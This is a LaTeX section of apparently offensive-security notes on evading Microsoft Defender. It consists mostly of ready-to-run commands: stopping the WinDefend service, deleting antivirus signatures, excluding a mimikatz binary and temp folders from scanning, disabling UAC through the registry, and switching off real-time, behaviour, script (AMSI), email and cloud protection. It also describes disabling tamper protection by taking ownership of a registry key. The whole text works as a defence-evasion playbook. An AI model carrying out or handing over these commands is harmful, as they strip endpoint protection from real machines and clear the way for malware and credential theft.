\section{Defender}

\subsection{Malware dev}

see~\ref{misc:defender-dev}

\subsection{attacking the service}
\href{https://learn.microsoft.com/en-us/defender-endpoint/use-group-policy-microsoft-defender-antivirus}{https://learn.microsoft.com/en-us/defender-endpoint/use-group-policy-microsoft-defender-antivirus}

\subsubsection{To Test}
Try to see is tamper protection can be bypassed Ã  la \verb+TrustedInstaller+ taking ownership of the registry\ldots


\subsubsection{Attacking tamper protection}

\href{https://learn.microsoft.com/en-us/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection}{Protect security settings with tamper protection}

Tamper protection managed either by Intune, SCCM or graphically not by GPO.

\subsubsection{Stopping the service}

\begin{verbatim}
sc config WinDefend start= disabled
sc stop WinDefend
\end{verbatim}

try action with \verb+nt authority\system+

\subsubsection{Removing signatures}
\begin{verbatim}
C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe -RemoveDefinitions -All
\end{verbatim}


\subsubsection{Exclusion}
\begin{verbatim}
$mimi = "C:\Users\snovvcrash\music\mimi\x64\mimikatz.exe"
Add-MpPreference -ExclusionPath $mimi -AttackSurfaceReductionOnlyExclusions $mimi
\end{verbatim}

it is necessary to remove signatures.



\subsection{Old}


\href{https://cloudbrothers.info/current-limits-defender-av-tamper-protection/}{Current limits of Defender AV Tamper Protection}

\begin{verbatim}
# Check if Defender is enabled
Get-MpComputerStatus
Get-MpComputerStatus | Select AntivirusEnabled

# Check if defensive modules are enabled
Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL

# Check if tamper protection is enabled
Get-MpComputerStatus | Select IsTamperProtected,RealTimeProtectionEnabled | FL

# Check ExclusionPath
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
\end{verbatim}

Note: Disabling UAC is advisable before attempting to turn features off. In testing some changes prompted for user confirmation before allowing change.

\begin{verbatim}
cmd.exe /c "C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
\end{verbatim}

Note: If Tamper protection is enabled you will not be able to turn off Defender by CMD or PowerShell. You can however, still create an exclusion.

\begin{verbatim}
# Disables realtime monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Disables scanning for downloaded files or attachments
Set-MpPreference -DisableIOAVProtection $true

# Disable behaviour monitoring
Set-MPPreference -DisableBehaviourMonitoring $true

# Make exclusion for a certain folder
Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# Disables cloud detection
Set-MPPreference -DisableBlockAtFirstSeen $true

# Disables scanning of .pst and other email formats
Set-MPPreference -DisableEmailScanning $true

# Disables script scanning during malware scans
Set-MPPReference -DisableScriptScanning $true

# Exclude files by extension
Set-MpPreference -ExclusionExtension "ps1"

# Turn off everything and set exclusion to "C:\Windows\Temp"
Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true;Add-MpPreference -ExclusionPath "C:\Windows\Temp"
\end{verbatim}


might need to disable {\bf Tamper Protection first}

\begin{verbatim}
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features
TamperProtection DWORD

0 = Off
5 = On

TamperProtectionSource ??????????


To configure with registry, go to HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features.

Take ownership of Features key first.

Create/set TamperProtection DWORD to 0 to disable Tamper Protection or 5 to enable Tamper Protection.
\end{verbatim}



\begin{verbatim}
# Check status
Get-MpComputerStatus
Get-MpPreference | select Exclusion* | fl #Check exclusions
# Disable
Set-MpPreference -DisableRealtimeMonitoring $true
#To completely disable Windows Defender on a computer, use the command:
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
# Set exclusion path
Set-MpPreference -ExclusionPath (pwd) -disablerealtimemonitoring
Add-MpPreference -ExclusionPath (pwd)

# Check exclusions configured via GPO
Parse-PolFile .\Registry.pol

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions
ValueName : Exclusions_Paths
ValueType : REG_DWORD
ValueLength : 4
ValueData : 1

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions\Paths
ValueName : C:\Windows\Temp
ValueType : REG_SZ
ValueLength : 4
ValueData : 0
\end{verbatim}



\begin{verbatim}
# Disable Realtime Monitoring
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
# Disable scans all downloaded files and attachments.
PS C:\> Set-MpPreference -DisableIOAVProtection $true

# disable AMSI (set to 0 to enable)
PS C:\> Set-MpPreference -DisableScriptScanning 1

# exclude a folder
PS C:\> Add-MpPreference -ExclusionPath "C:\Temp"
PS C:\> Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
PS C:\> Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"

# remove signatures (if Internet connection is present, they will be downloaded again):
PS > & "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
PS > & "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
\end{verbatim}

